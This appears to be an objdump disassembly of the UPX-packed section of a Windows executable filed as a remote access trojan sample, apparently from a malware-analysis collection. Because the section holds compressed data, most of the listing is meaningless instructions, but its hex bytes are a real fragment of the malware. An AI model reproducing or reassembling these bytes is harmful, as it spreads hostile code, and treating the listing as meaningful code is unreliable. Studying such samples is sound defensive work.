
malware_samples/rat/d40e990952381a185b49189ddc8cf7e7363439be73a85ffa438310a6ecf6a64d.exe:     file format pei-i386


Disassembly of section UPX1:

13158000 <UPX1>:
13158000:	df 36                	fbstp  (%esi)
13158002:	ff                   	(bad)
13158003:	ff 04 10             	incl   (%eax,%edx,1)
13158006:	14 13                	adc    $0x13,%al
13158008:	09 08                	or     %ecx,(%eax)
1315800a:	57                   	push   %edi
1315800b:	69 64 65 43 68 61 72 	imul   $0x3726168,0x43(%ebp,%eiz,2),%esp
13158012:	03 
13158013:	00 ff                	add    %bh,%bh
13158015:	ff 03                	incl   (%ebx)
13158017:	90                   	nop
13158018:	ff 25 e8 06 19 64    	jmp    *0x641906e8
1315801e:	fb                   	sti
1315801f:	71 15                	jno    0x13158036
13158021:	13 8b c0 07 e4 e0    	adc    -0x1f1bf840(%ebx),%ecx
13158027:	dc 19                	fcompl (%ecx)
13158029:	64 90                	fs nop
1315802b:	41                   	inc    %ecx
1315802c:	d8 d4                	fcom   %st(4)
1315802e:	d0 64 90 41          	shlb   $1,0x41(%eax,%edx,4)
13158032:	06                   	push   %es
13158033:	cc                   	int3
13158034:	c8 c4 90 41          	enter  $0x90c4,$0x41
13158038:	06                   	push   %es
13158039:	19 c0                	sbb    %eax,%eax
1315803b:	bc b8 41 06 19       	mov    $0x190641b8,%esp
13158040:	64 f4                	fs hlt
13158042:	b4 b0                	mov    $0xb0,%ah
13158044:	06                   	push   %es
13158045:	19 64 90 ac          	sbb    %esp,-0x54(%eax,%edx,4)
13158049:	a8 a4                	test   $0xa4,%al
1315804b:	a0 72 72 90 41       	mov    0x41907272,%al
13158050:	9c                   	pushf
13158051:	04 72                	add    $0x72,%al
13158053:	00 c9                	add    %cl,%cl
13158055:	41                   	inc    %ecx
13158056:	4e                   	dec    %esi
13158057:	0e                   	push   %cs
13158058:	fc                   	cld
13158059:	71 98                	jno    0x13157ff3
1315805b:	14 72                	adc    $0x72,%al
1315805d:	4e                   	dec    %esi
1315805e:	0e                   	push   %cs
1315805f:	32 c8                	xor    %al,%cl
13158061:	10 0c 94             	adc    %cl,(%esp,%edx,4)
13158064:	71 90                	jno    0x13157ff6
13158066:	7f 64                	jg     0x131580cc
13158068:	90                   	nop
13158069:	41                   	inc    %ecx
1315806a:	8c 88 53 83 c4 bc    	mov    %cs,-0x433b7cad(%eax)
13158070:	bb 0a fd ff db       	mov    $0xdbfffd0a,%ebx
13158075:	0d 0d 54 e8 05       	or     $0x5e8540d,%eax
1315807a:	04 a4                	add    $0xa4,%al
1315807c:	f6 44 24 2c 01       	testb  $0x1,0x2c(%esp)
13158081:	74 05                	je     0x13158088
13158083:	0f b7 5c 24 30       	movzwl 0x30(%esp),%ebx
13158088:	8b c3                	mov    %ebx,%eax
1315808a:	4f                   	dec    %edi
1315808b:	0e                   	push   %cs
1315808c:	f2 bd 1b 44 5b c3    	repnz mov $0xc35b441b,%ebp
13158092:	63 84 80 71 7c 71 64 	arpl   %eax,0x64717c71(%eax,%eax,4)
13158099:	90                   	nop
1315809a:	93                   	xchg   %eax,%ebx
1315809b:	27                   	daa
1315809c:	78 71                	js     0x1315810f
1315809e:	74 70                	je     0x13158110
131580a0:	c2 4f 06             	ret    $0x64f
131580a3:	19 6c 68 56          	sbb    %ebp,0x56(%eax,%ebp,2)
131580a7:	be d0 d5 7e ff       	mov    $0xff7ed5d0,%esi
131580ac:	37                   	aaa
131580ad:	b7 ff                	mov    $0xff,%bh
131580af:	83 3e 00             	cmpl   $0x0,(%esi)
131580b2:	75 3a                	jne    0x131580ee
131580b4:	68 44 06 6c 6a       	push   $0x6a6c0644
131580b9:	00 01                	add    %al,(%ecx)
131580bb:	38 8b c8 85 c9 75    	cmp    %cl,0x75c985c8(%ebx)
131580c1:	05 33 c0 5e ff       	add    $0xff5ec033,%eax
131580c6:	7f ef                	jg     0x131580b7
131580c8:	6e                   	outsb  %ds:(%esi),(%dx)
131580c9:	64 a1 cc 20 89 01    	mov    %fs:0x18920cc,%eax
131580cf:	89 0d 07 33 d2 8b    	mov    %ecx,0x8bd23307
131580d5:	c2 03 c0             	ret    $0xc003
131580d8:	8d 44 c1 04          	lea    0x4(%ecx,%eax,8),%eax
131580dc:	8b fb                	mov    %ebx,%edi
131580de:	bb ff ff 1e 89       	mov    $0x891effff,%ebx
131580e3:	18 89 06 42 83 fa    	sbb    %cl,-0x57cbdfa(%ecx)
131580e9:	64 75 ec             	fs jne 0x131580d8
131580ec:	8b 06                	mov    (%esi),%eax
131580ee:	8b 10                	mov    (%eax),%edx
131580f0:	89 16                	mov    %edx,(%esi)
131580f2:	2b 90 89 00 89 40    	sub    0x40890089(%eax),%edx
131580f8:	04 c3                	add    $0xc3,%al
131580fa:	57                   	push   %edi
131580fb:	fe 83 fd fd 8b f2    	incb   -0xd740203(%ebx)
13158101:	8b d8                	mov    %eax,%ebx
13158103:	4a                   	dec    %edx
13158104:	78 85                	js     0x1315808b
13158106:	c0 48 8b 16          	rorb   $0x16,-0x75(%eax)
1315810a:	89 50 08             	mov    %edx,0x8(%eax)
1315810d:	8b 56 04             	mov    0x4(%esi),%edx
13158110:	de b6 ad dd 05 0c    	fidivs 0xc05ddad(%esi)
13158116:	8b 50 30             	mov    0x30(%eax),%edx
13158119:	58                   	pop    %eax
1315811a:	09 42 02             	or     %eax,0x2(%edx)
1315811d:	03 b0 01 db db 7e    	add    0x7edbdb01(%eax),%esi
13158123:	fb                   	sti
13158124:	1b 50 50             	sbb    0x50(%eax),%edx
13158127:	08 89 0a 89 51 06    	or     %cl,0x651890a(%ecx)
1315812d:	15 90 1e a3 ef       	adc    $0xefa31e90,%eax
13158132:	ff                   	(bad)
13158133:	bf 7d 06 c3 47       	mov    $0x47c3067d,%edi
13158138:	57                   	push   %edi
13158139:	55                   	push   %ebp
1315813a:	51                   	push   %ecx
1315813b:	8b f1                	mov    %ecx,%esi
1315813d:	89 14 24             	mov    %edx,(%esp)
13158140:	8b e8                	mov    %eax,%ebp
13158142:	8b 5d 00             	mov    0x0(%ebp),%ebx
13158145:	8b 04 24             	mov    (%esp),%eax
13158148:	69 e1 bf bb 75 2d    	imul   $0x2d75bbbf,%ecx,%esp
1315814e:	89 47 8b             	mov    %eax,-0x75(%edi)
13158151:	3b 77 53             	cmp    0x53(%edi),%esi
13158154:	08 03                	or     %al,(%ebx)
13158156:	53                   	push   %ebx
13158157:	0c 3b                	or     $0x3b,%al
13158159:	c2 75 14             	ret    $0x1475
1315815c:	12 ff                	adc    %bh,%bh
1315815e:	b6 6d                	mov    $0x6d,%dh
13158160:	5d                   	pop    %ebp
13158161:	6d                   	insl   (%dx),%es:(%edi)
13158162:	02 21                	add    (%ecx),%ah
13158164:	43                   	inc    %ebx
13158165:	46                   	inc    %esi
13158166:	06                   	push   %es
13158167:	04 0c                	add    $0xc,%al
13158169:	01 46 04             	add    %eax,0x4(%esi)
1315816c:	eb 15                	jmp    0x13158183
1315816e:	03 ff                	add    %edi,%edi
13158170:	25 bb 2d 3b 0f       	and    $0xf3b2dbb,%eax
13158175:	75 0d                	jne    0x13158184
13158177:	1b 16                	sbb    (%esi),%edx
13158179:	8b df                	mov    %edi,%ebx
1315817b:	3b eb                	cmp    %ebx,%ebp
1315817d:	75 5b                	jne    0x131581da
1315817f:	59                   	pop    %ecx
13158180:	7e 6f                	jle    0x131581f1
13158182:	70 d6                	jo     0x1315815a
13158184:	8b c5                	mov    %ebp,%eax
13158186:	9e                   	sahf
13158187:	d0 84 04 33 5a fb b6 	rolb   $1,-0x4904a5cd(%esp,%eax,1)
1315818e:	f0 dc 5d 5f          	lock fcompl 0x5f(%ebp)
13158192:	87 6f 5a             	xchg   %ebp,0x5a(%edi)
13158195:	f8                   	clc
13158196:	ba 8b fb 8b 32       	mov    $0x328bfb8b,%edx
1315819b:	4b                   	dec    %ebx
1315819c:	db db                	fcmovnu %st(3),%st
1315819e:	db bf 3b f0 72 70    	fstpt  0x7072f03b(%edi)
131581a4:	8b ce                	mov    %esi,%ecx
131581a6:	03 4a 35             	add    0x35(%edx),%ecx
131581a9:	e8 03 6b 67 cd       	call   0xe07cecb1
131581ae:	77 62                	ja     0x13158212
131581b0:	11 75 e1             	adc    %esi,-0x1f(%ebp)
131581b3:	ad                   	lods   %ds:(%esi),%eax
131581b4:	6b db 1b             	imul   $0x1b,%ebx,%ebx
131581b7:	8b b7 01 1b 05 29    	mov    0x29051b01(%edi),%esi
131581bd:	51                   	push   %ecx
131581be:	83 7b 0c 3b          	cmpl   $0x3b,0xc(%ebx)
131581c2:	60                   	pusha
131581c3:	bf 1d 6c 48 61       	mov    $0x61486c1d,%edi
131581c8:	eb 3f                	jmp    0x13158209
131581ca:	2c 8b                	sub    $0x8b,%al
131581cc:	7a 04                	jp     0x131581d2
131581ce:	03 cf                	add    %edi,%ecx
131581d0:	2e db 76 df          	(bad) %cs:-0x21(%esi)
131581d4:	b6 f9                	mov    $0xf9,%dh
131581d6:	29 1e                	sub    %ebx,(%esi)
131581d8:	eb 2a                	jmp    0x13158204
131581da:	8b 0a                	mov    (%edx),%ecx
131581dc:	41                   	inc    %ecx
131581dd:	89 0c bb             	mov    %ecx,(%ebx,%edi,4)
131581e0:	7b ad                	jnp    0x1315818f
131581e2:	bd 85 ff 5b 0f       	mov    $0xf5bff85,%ebp
131581e7:	2b f9                	sub    %ecx,%edi
131581e9:	89 7c 24 04          	mov    %edi,0x4(%esp)
131581ed:	2b f0                	sub    %eax,%esi
131581ef:	89 73 07             	mov    %esi,0x7(%ebx)
131581f2:	d4 38                	aam    $0x38
131581f4:	ed                   	in     (%dx),%eax
131581f5:	b7 85                	mov    $0x85,%bh
131581f7:	93                   	xchg   %eax,%ebx
131581f8:	85 eb                	test   %ebp,%ebx
131581fa:	0c 0c                	or     $0xc,%al
131581fc:	eb 57                	jmp    0x13158255
131581fe:	1b 3b                	sbb    (%ebx),%edi
13158200:	fb                   	sti
13158201:	75 81                	jne    0x13158184
13158203:	0d bf f0 bb b3       	or     $0xb3bbf0bf,%eax
13158208:	59                   	pop    %ecx
13158209:	92                   	xchg   %eax,%edx
1315820a:	90                   	nop
1315820b:	93                   	xchg   %eax,%ebx
1315820c:	8b da                	mov    %edx,%ebx
1315820e:	8b f0                	mov    %eax,%esi
13158210:	81 fe 9d 10 00 7d    	cmp    $0x7d00109d,%esi
13158216:	07                   	pop    %es
13158217:	be 76 fa 74 7b       	mov    $0x7b74fa76,%esi
1315821c:	06                   	push   %es
1315821d:	29 81 c6 24 81 e6    	sub    %eax,-0x197edb3a(%ecx)
13158223:	2c 49                	sub    $0x49,%al
13158225:	bf 4d d8 fe 04       	mov    $0x4fed84d,%edi
1315822a:	6a 01                	push   $0x1
1315822c:	68 00 20 0b 56       	push   $0x560b2000
13158231:	bf 8f f8 89 3b       	mov    $0x3b89f88f,%edi
13158236:	85 ff                	test   %edi,%edi
13158238:	d8 0e                	fmuls  (%esi)
1315823a:	33 fc                	xor    %esp,%edi
1315823c:	74 23                	je     0x13158261
1315823e:	8b d3                	mov    %ebx,%edx
13158240:	b8 d4 47 63 13       	mov    $0x136347d4,%eax
13158245:	24 80                	and    $0x80,%al
13158247:	3e ac                	lods   %ds:(%esi),%al
13158249:	fb                   	sti
1315824a:	7e e3                	jle    0x1315822f
1315824c:	8b 03                	mov    (%ebx),%eax
1315824e:	50                   	push   %eax
1315824f:	12 50 f8             	adc    -0x8(%eax),%dl
13158252:	03 63 55             	add    0x55(%ebx),%esp
13158255:	8b d9                	mov    %ecx,%ebx
13158257:	be b1 df 1b b3       	mov    $0xb31bdfb1,%esi
1315825c:	e8 c7 43 04 60       	call   0x7319c628
13158261:	6a 04                	push   $0x4
13158263:	4f                   	dec    %edi
13158264:	68 0b 55 26 47       	push   $0x4726550b
13158269:	76 c0                	jbe    0x1315822b
1315826b:	52                   	push   %edx
1315826c:	75 1f                	jne    0x1315828d
1315826e:	78 04                	js     0x13158274
13158270:	4b                   	dec    %ebx
13158271:	80 bd cd 24 4e 83 3b 	cmpb   $0x3b,-0x7cb1db33(%ebp)
13158278:	00 76 db             	add    %dh,-0x25(%esi)
1315827b:	1a 0a                	sbb    (%edx),%cl
1315827d:	37                   	aaa
1315827e:	24 6f                	and    $0x6f,%al
13158280:	ec                   	in     (%dx),%al
13158281:	89 4c 10 e3          	mov    %ecx,-0x1d(%eax,%edx,1)
13158285:	c7                   	(bad)
13158286:	68 df 70 37 e2       	push   $0xe23770df
1315828b:	08 ff                	or     %bh,%bh
1315828d:	00 65 89             	add    %ah,-0x77(%ebp)
13158290:	54                   	push   %esp
13158291:	24 0c                	and    $0xc,%al
13158293:	8b 34 fc             	mov    (%esp,%edi,8),%esi
13158296:	de 6e ee             	fisubrs -0x12(%esi)
13158299:	03 c5                	add    %ebp,%eax
1315829b:	89 14 10             	mov    %edx,(%eax,%edx,1)
1315829e:	8b 1d 4e eb 51 f2    	mov    0xf251eb4e,%ebx
131582a4:	73 f6                	jae    0x1315829c
131582a6:	6e                   	outsb  %ds:(%esi),(%dx)
131582a7:	e1 2f                	loope  0x131582d8
131582a9:	93                   	xchg   %eax,%ebx
131582aa:	ee                   	out    %al,(%dx)
131582ab:	77 46                	ja     0x131582f3
131582ad:	8b c6                	mov    %esi,%eax
131582af:	03 7a 3b             	add    0x3b(%edx),%edi
131582b2:	19 77 3b             	sbb    %esi,0x3b(%edi)
131582b5:	3b 74 34 d7          	cmp    -0x29(%esp,%esi,1),%esi
131582b9:	1e                   	push   %ds
131582ba:	e6 b6                	out    %al,$0xb6
131582bc:	86 89 05 14 0c 76    	xchg   %cl,0x760c1405(%ecx)
131582c2:	0e                   	push   %cs
131582c3:	05 f7 e6 63 30       	add    $0x3063e6f7,%eax
131582c8:	74 56                	je     0x13158320
131582ca:	85 50 0a             	test   %edx,0xa(%eax)
131582cd:	c7 05 b0 45 fe 3e 0c 	movl   $0x5101530c,0x3efe45b0
131582d4:	53 01 51 
131582d7:	10 df                	adc    %bl,%bh
131582d9:	81 fb 58 75 a7 8b    	cmp    $0x8ba77558,%ebx
131582df:	7d 5b                	jge    0x1315833c
131582e1:	bb db 2f 04 75       	mov    $0x75042fdb,%ebx
131582e6:	10 83 7c 37 bf 19    	adc    %al,0x19bf377c(%ebx)
131582ec:	0e                   	push   %cs
131582ed:	8b 9c eb 5a a3 82 4a 	mov    0x4a82a35a(%ebx,%ebp,8),%ebx
131582f4:	79 48                	jns    0x1315833e
131582f6:	2b 96 0d d8 80 b1    	sub    -0x4e7f27f3(%esi),%edx
131582fc:	3d ae ab 14 27       	cmp    $0x2714abae,%eax
13158301:	f4                   	hlt
13158302:	b7 c3                	mov    $0xc3,%bh
13158304:	b7 ed                	mov    $0xed,%bh
13158306:	3f                   	aas
13158307:	8b d0                	mov    %eax,%edx
13158309:	8b ea                	mov    %edx,%ebp
1315830b:	81 e5 00 f0 b9 03    	and    $0x3b9f000,%ebp
13158311:	0c 81                	or     $0x81,%al
13158313:	c2 ff 0f             	ret    $0xfff
13158316:	1f                   	pop    %ds
13158317:	77 cd                	ja     0x131582e6
13158319:	e6 5e                	out    %al,$0x5e
1315831b:	e2 0e                	loop   0x1315832b
1315831d:	c6                   	(bad)
1315831e:	39 44 28 05          	cmp    %eax,0x5(%eax,%ebp,1)
13158322:	08 2b                	or     %ch,(%ebx)
13158324:	c5 7c 7b ec          	lds    -0x14(%ebx,%edi,2),%edi
13158328:	60                   	pusha
13158329:	45                   	inc    %ebp
1315832a:	8b 35 ce 3c 8b 5e    	mov    0x5e8b3cce,%esi
13158330:	1d 7e 0c 03 fb       	sbb    $0xfb030c7e,%eax
13158335:	c1 6d db 6f          	shrl   $0x6f,-0x25(%ebp)
13158339:	90                   	nop
1315833a:	76 02                	jbe    0x1315833e
1315833c:	8b dd                	mov    %ebp,%ebx
1315833e:	3b 7b 08             	cmp    0x8(%ebx),%edi
13158341:	b9 8b 05 ff e7       	mov    $0xe7ff058b,%ecx
13158346:	fb                   	sti
13158347:	f2 70 76             	bnd jo 0x131583c0
1315834a:	1e                   	push   %ds
1315834b:	57                   	push   %edi
1315834c:	10 2b                	adc    %ch,(%ebx)
1315834e:	fb                   	sti
1315834f:	57                   	push   %edi
13158350:	53                   	push   %ebx
13158351:	c0 48 c6 1a          	rorb   $0x1a,-0x3a(%eax)
13158355:	db 61 a5             	(bad) -0x5b(%ecx)
13158358:	eb 09                	jmp    0x13158363
1315835a:	36 0e                	ss push %cs
1315835c:	b9 bc 1d a7 d3       	mov    $0xd3a71dbc,%ecx
13158361:	d9 91 0c 73 2b b9    	fsts   -0x46d48cf4(%ecx)
13158367:	f3 72 1b             	repz jb 0x13158385
1315836a:	f9                   	stc
1315836b:	0c a1                	or     $0xa1,%al
1315836d:	81 e6 34 9d eb 03    	and    $0x3eb9d34,%esi
13158373:	6e                   	outsb  %ds:(%esi),(%dx)
13158374:	a3 64 08 4f c8       	mov    %eax,0xc84f0864
13158379:	f7 2b                	imull  (%ebx)
1315837b:	06                   	push   %es
1315837c:	b7 9f                	mov    $0x9f,%bh
1315837e:	e4 b0                	in     $0xb0,%al
13158380:	41                   	inc    %ecx
13158381:	84 38                	test   %bh,(%eax)
13158383:	1c 24                	sbb    $0x24,%al
13158385:	73 03                	jae    0x1315838a
13158387:	8b 04 3b             	mov    (%ebx,%edi,1),%eax
1315838a:	ef                   	out    %eax,(%dx)
1315838b:	c2 64 eb             	ret    $0xeb64
1315838e:	b6 73                	mov    $0x73,%dh
13158390:	8c fd                	mov    %?,%ebp
13158392:	82 1c 80 40          	sbbb   $0x40,(%eax,%eax,4)
13158396:	41                   	inc    %ecx
13158397:	33 0e                	xor    (%esi),%ecx
13158399:	3b 43 02             	cmp    0x2(%ebx),%eax
1315839c:	80 c0 a5             	add    $0xa5,%al
1315839f:	ee                   	out    %al,(%dx)
131583a0:	8d 21                	lea    (%ecx),%esp
131583a2:	b5 8d                	mov    $0x8d,%ch
131583a4:	2a 3b                	sub    (%ebx),%bh
131583a6:	44                   	inc    %esp
131583a7:	f8                   	clc
131583a8:	bd e4 1a e3 25       	mov    $0x25e31ae4,%ebp
131583ad:	77 f7                	ja     0x131583a6
131583af:	81 c7 ff 3f 86 e7    	add    $0xe7863fff,%edi
131583b5:	00 c0                	add    %al,%al
131583b7:	79 bb                	jns    0x13158374
131583b9:	eb 33                	jmp    0x131583ee
131583bb:	3b fb                	cmp    %ebx,%edi
131583bd:	d7                   	xlat   %ds:(%ebx)
131583be:	ce                   	into
131583bf:	d4 74                	aam    $0x74
131583c1:	7f 2c                	jg     0x131583ef
131583c3:	20 d7                	and    %dl,%bh
131583c5:	58                   	pop    %eax
131583c6:	52                   	push   %edx
131583c7:	04 b0                	add    $0xb0,%al
131583c9:	76 90                	jbe    0x1315835b
131583cb:	49                   	dec    %ecx
131583cc:	46                   	inc    %esi
131583cd:	7a 74                	jp     0x13158443
131583cf:	50                   	push   %eax
131583d0:	8b 46 4c             	mov    0x4c(%esi),%eax
131583d3:	46                   	inc    %esi
131583d4:	3e b3 6b             	ds mov $0x6b,%bl
131583d7:	ba e9 35 09 dd       	mov    $0xdd0935e9,%edx
131583dc:	75 c9                	jne    0x131583a7
131583de:	aa                   	stos   %al,%es:(%edi)
131583df:	c7                   	(bad)
131583e0:	2e 03 1c dc          	add    %cs:(%esp,%ebx,8),%ebx
131583e4:	f6 83 f4 21 8b cc ba 	testb  $0xba,-0x3374de0c(%ebx)
131583eb:	02 18                	add    (%eax),%bl
131583ed:	83 3c 24 2d          	cmpl   $0x2d,(%esp)
131583f1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
131583f2:	10 98 74 fa ba 0b    	adc    %bl,0xbbafa74(%eax)
131583f8:	06                   	push   %es
131583f9:	21 f8                	and    %edi,%eax
131583fb:	c8 36 56 7a          	enter  $0x5636,$0x7a
131583ff:	7a 4c                	jp     0x1315844d
13158401:	0f 5b 77 fa          	cvtdq2ps -0x6(%edi),%xmm6
13158405:	3e 92                	ds xchg %eax,%edx
13158407:	8d 05 de 04 02 61    	lea    0x610204de,%eax
1315840d:	53                   	push   %ebx
1315840e:	3b 54 33 74          	cmp    0x74(%ebx,%esi,1),%edx
13158412:	77 df                	ja     0x131583f3
13158414:	75 f5                	jne    0x1315840b
13158416:	04 57                	add    $0x57,%al
13158418:	a2 0f 8e 96 df       	mov    %al,0xdf968e0f
1315841d:	8d                   	lea    (bad),%ebx
1315841e:	d9 a8 f1 39 5c 6b    	fldcw  0x6b5c39f1(%eax)
13158424:	2b 5b ab             	sub    -0x55(%ebx),%ebx
13158427:	55                   	push   %ebp
13158428:	5d                   	pop    %ebp
13158429:	80 61 86 dd          	andb   $0xdd,-0x7a(%ecx)
1315842d:	d2 1c 04             	rcrb   %cl,(%esp,%eax,1)
13158430:	33 1a                	xor    (%edx),%ebx
13158432:	0c 8d                	or     $0x8d,%al
13158434:	c8 85 2c 08          	enter  $0x2c85,$0x8
13158438:	df 8f 32 75 b1 15    	fisttps 0x15b17532(%edi)
1315843e:	8b ee                	mov    %esi,%ebp
13158440:	8b 66 b7             	mov    -0x49(%esi),%esp
13158443:	07                   	pop    %es
13158444:	43                   	inc    %ebx
13158445:	6c                   	insb   (%dx),%es:(%edi)
13158446:	ab                   	stos   %eax,%es:(%edi)
13158447:	e9 0b 07 6f 4d       	jmp    0x60848b57
1315844c:	07                   	pop    %es
1315844d:	c8 80 35 9f          	enter  $0x3580,$0x9f
13158451:	46                   	inc    %esi
13158452:	34 0f                	xor    $0xf,%al
13158454:	96                   	xchg   %eax,%esi
13158455:	8e 30                	mov    (%eax),%?
13158457:	c7 85 66 fe 4a eb 83 	movl   $0xe156b83,-0x14b5019a(%ebp)
1315845e:	6b 15 0e 
13158461:	05 36 1b f5 a9       	add    $0xa9f51b36,%eax
13158466:	48                   	dec    %eax
13158467:	1c d8                	sbb    $0xd8,%al
13158469:	76 86                	jbe    0x131583f1
1315846b:	d7                   	xlat   %ds:(%ebx)
1315846c:	d7                   	xlat   %ds:(%ebx)
1315846d:	d7                   	xlat   %ds:(%ebx)
1315846e:	3c 48                	cmp    $0x48,%al
13158470:	20 83 38 53 28 49    	and    %al,0x49285338(%ebx)
13158476:	78 11                	js     0x13158489
13158478:	1e                   	push   %ds
13158479:	1f                   	pop    %ds
1315847a:	40                   	inc    %eax
1315847b:	4e                   	dec    %esi
1315847c:	08 51 86             	or     %dl,-0x7a(%ecx)
1315847f:	11 ec                	adc    %ebp,%esp
13158481:	90                   	nop
13158482:	10 07                	adc    %al,(%edi)
13158484:	49                   	dec    %ecx
13158485:	c6                   	(bad)
13158486:	08 3b                	or     %bh,(%ebx)
13158488:	36 9c                	ss pushf
1315848a:	7f 22                	jg     0x131584ae
1315848c:	8b f9                	mov    %ecx,%edi
1315848e:	c4 8d 98 1b bf ad    	les    -0x5240e468(%ebp),%ecx
13158494:	8d                   	lea    (bad),%ecx
13158495:	c8 e3 35 03          	enter  $0x35e3,$0x3
13158499:	70 e6                	jo     0x13158481
1315849b:	0a 3b                	or     (%ebx),%bh
1315849d:	de 9c 1d 7b eb 73 5b 	ficomps 0x5b73eb7b(%ebp,%ebx,1)
131584a4:	8b cf                	mov    %edi,%ecx
131584a6:	d6                   	salc
131584a7:	2b d3                	sub    %ebx,%edx
131584a9:	44                   	inc    %esp
131584aa:	05 44 cb b8 c9       	add    $0xc9b8cb44,%eax
131584af:	be 1d 3b 4e b8       	mov    $0xb84e3b1d,%esi
131584b4:	8b 5c 0f 85          	mov    -0x7b(%edi,%ecx,1),%ebx
131584b8:	db 74 1f b5          	(bad) -0x4b(%edi,%ebx,1)
131584bc:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
131584bd:	73 4d                	jae    0x1315850c
131584bf:	b3 c3                	mov    $0xc3,%bl
131584c1:	b3 38                	mov    $0x38,%bl
131584c3:	89 c0                	mov    %eax,%eax
131584c5:	07                   	pop    %es
131584c6:	10 81 93 bd b3 08    	adc    %al,0x8b3bd93(%ecx)
131584cc:	f5                   	cmc
131584cd:	14 f1                	adc    $0xf1,%al
131584cf:	3b 88 eb 7a 7d db    	cmp    -0x24828515(%eax),%ecx
131584d5:	7a ee                	jp     0x131584c5
131584d7:	07                   	pop    %es
131584d8:	8d 8c 80 ec 9b 55 68 	lea    0x68559bec(%eax,%eax,4),%ecx
131584df:	be 18 ed 07 eb       	mov    $0xeb07ed18,%esi
131584e4:	bf 1c 64 ff 32       	mov    $0x32ff641c,%edi
131584e9:	64 89 22             	mov    %esp,%fs:(%edx)
131584ec:	68 b4 43 58 80       	push   $0x805843b4
131584f1:	3d 35 d0 0a 36       	cmp    $0x360ad035,%eax
131584f6:	59                   	pop    %ecx
131584f7:	93                   	xchg   %eax,%ebx
131584f8:	6d                   	insl   (%dx),%es:(%edi)
131584f9:	3e 0a 12             	or     %ds:(%edx),%dl
131584fc:	60                   	pusha
131584fd:	60                   	pusha
131584fe:	c8 4e 06 0f          	enter  $0x64e,$0xf
13158502:	b2 1b                	mov    $0x1b,%dl
13158504:	09 10                	or     %edx,(%eax)
13158506:	d6                   	salc
13158507:	68 f8 0f cb e3       	push   $0xe3cb0ff8
1315850c:	ed                   	in     (%dx),%eax
1315850d:	ed                   	in     (%dx),%eax
1315850e:	4e                   	dec    %esi
1315850f:	a3 0c 15 83 3d       	mov    %eax,0x3d83150c
13158514:	05 41 2f b8 03       	add    $0x3b82f41,%eax
13158519:	bd 70 fd d2 ef       	mov    $0xefd2fd70,%ebp
1315851e:	15 0d 33 c9 bf       	adc    $0xbfc9330d,%eax
13158523:	82 f4 40             	xor    $0x40,%ah
13158526:	3d 01 f1 1b 38       	cmp    $0x381bf101,%eax
1315852b:	70 37                	jo     0x13158564
1315852d:	c4 b8 f4 46 bd c2    	les    -0x3d42b90c(%eax),%edi
13158533:	a3 6f 6f af bb       	mov    %eax,0xbbaf6f6f
13158538:	00 1c c6             	add    %bl,(%esi,%eax,8)
1315853b:	05 ac 2c 9f 5a       	add    $0x5a9f2cac,%eax
13158540:	59                   	pop    %ecx
13158541:	59                   	pop    %ecx
13158542:	8b 10                	mov    (%eax),%edx
13158544:	68 c5 40 c3 2b       	push   $0x2bc340c5
13158549:	73 96                	jae    0x131584e1
1315854b:	86 68 c3             	xchg   %ch,-0x3d(%eax)
1315854e:	df 1f                	fistps (%edi)
13158550:	e1 b5                	loope  0x13158507
13158552:	ef                   	out    %eax,(%dx)
13158553:	bb b8 e5 a0 2d       	mov    $0x2da0e5b8,%ebx
13158558:	5d                   	pop    %ebp
13158559:	c3                   	ret
1315855a:	53                   	push   %ebx
1315855b:	25 0b cb b0 21       	and    $0x21b0cb0b,%eax
13158560:	3f                   	aas
13158561:	77 84                	ja     0x131584e7
13158563:	cc                   	int3
13158564:	69 d1 a2 19 c7 23    	imul   $0x23c719a2,%ecx,%edx
1315856a:	f0 9e                	lock sahf
1315856c:	05 67 00 a1 90       	add    $0x90a10067,%eax
13158571:	1d 40 58 83 15       	sbb    $0x15835840,%eax
13158576:	2b b1 f3 12 c6 d5    	sub    -0x2a39ed0d(%ecx),%esi
1315857c:	98                   	cwtl
1315857d:	80 23 87             	andb   $0x87,(%ebx)
13158580:	3c b2                	cmp    $0xb2,%al
13158582:	24 16                	and    $0x16,%al
13158584:	09 83 b4 e6 02 b7    	or     %eax,-0x48fd194c(%ebx)
1315858a:	d9 6b e2             	fldcw  -0x1e(%ebx)
1315858d:	52                   	push   %edx
1315858e:	b4 74                	mov    $0x74,%ah
13158590:	17                   	pop    %ss
13158591:	31 15 0b 5d 40 4e    	xor    %edx,0x4e405d0b
13158597:	76 b0                	jbe    0x13158549
13158599:	16                   	push   %ss
1315859a:	75 e9                	jne    0x13158585
1315859c:	d9 a9 19 b7 83 4c    	fldcw  0x4c83b719(%ecx)
131585a2:	96                   	xchg   %eax,%esi
131585a3:	e3 70                	jecxz  0x13158615
131585a5:	db 5b df             	fistpl -0x21(%ebx)
131585a8:	53                   	push   %ebx
131585a9:	3b 89 f7 c4 87 05    	cmp    0x587c4f7(%ecx),%ecx
131585af:	1c 75                	sbb    $0x75,%al
131585b1:	09 82 15 0a b9 8b    	or     %eax,-0x7446f5eb(%edx)
131585b7:	26 7e fd             	es jle 0x131585b7
131585ba:	48                   	dec    %eax
131585bb:	08 81 f9 ac 7f 38    	or     %al,0x387facf9(%ecx)
131585c1:	89 17                	mov    %edx,(%edi)
131585c3:	39 03                	cmp    %eax,(%ebx)
131585c5:	b1 df                	mov    $0xdf,%cl
131585c7:	60                   	pusha
131585c8:	79 05                	jns    0x131585cf
131585ca:	c1 03 c1             	roll   $0xc1,(%ebx)
131585cd:	f9                   	stc
131585ce:	02 d4                	add    %ah,%dl
131585d0:	cc                   	int3
131585d1:	6f                   	outsl  %ds:(%esi),(%dx)
131585d2:	af                   	scas   %es:(%edi),%eax
131585d3:	2d fb 88 f4 eb       	sub    $0xebf488fb,%eax
131585d8:	24 16                	and    $0x16,%al
131585da:	d9 17                	fsts   (%edi)
131585dc:	15 8b f4 8b cd       	adc    $0xcd8bf48b,%eax
131585e1:	4c                   	dec    %esp
131585e2:	ed                   	in     (%dx),%eax
131585e3:	16                   	push   %ss
131585e4:	2e 02 89 40 ad 08 c6 	add    %cs:-0x39f752c0(%ecx),%cl
131585eb:	c6                   	(bad)
131585ec:	67 78 47             	addr16 js 0x13158636
131585ef:	9c                   	pushf
131585f0:	c3                   	ret
131585f1:	eb b4                	jmp    0x131585a7
131585f3:	4a                   	dec    %edx
131585f4:	ec                   	in     (%dx),%al
131585f5:	5e                   	pop    %esi
131585f6:	c2 2d f1             	ret    $0xf12d
131585f9:	c1 72 07 3a          	shll   $0x3a,0x7(%edx)
131585fd:	0c 06                	or     $0x6,%al
